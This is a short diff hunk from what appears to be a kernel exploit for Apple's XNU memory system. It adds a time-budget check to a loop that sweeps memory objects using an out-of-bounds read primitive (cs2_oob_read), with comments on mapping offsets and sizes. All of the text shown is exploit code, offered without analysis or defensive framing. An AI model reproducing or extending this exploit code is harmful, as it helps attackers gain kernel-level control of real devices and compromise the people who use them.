@@ -188,6 +188,7 @@ kern_return_t cs2_pe_v1(void) {
             // NOTE:
             // fix mach_vm_map err on free thread, we'd try to map outside memory object
             while (seeking_offset <= search_mapping_size - contiguous_mapping_size) {  // contiguous_mapping_size
+                if (cs2_expired()) { LOG("budget expired in sweep pass=%lu map=%lu off=%#llx", pass, s, (unsigned long long)seeking_offset); break; }
                 // memory_object -> memory entry at search_mapping_address (VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR)
                 // oob_size -> 0xf00, oob_offset -> 0x100
                 kr = cs2_oob_read(memory_object, seeking_offset, cs2_ctx.oob_size, cs2_ctx.oob_offset, read_buffer);
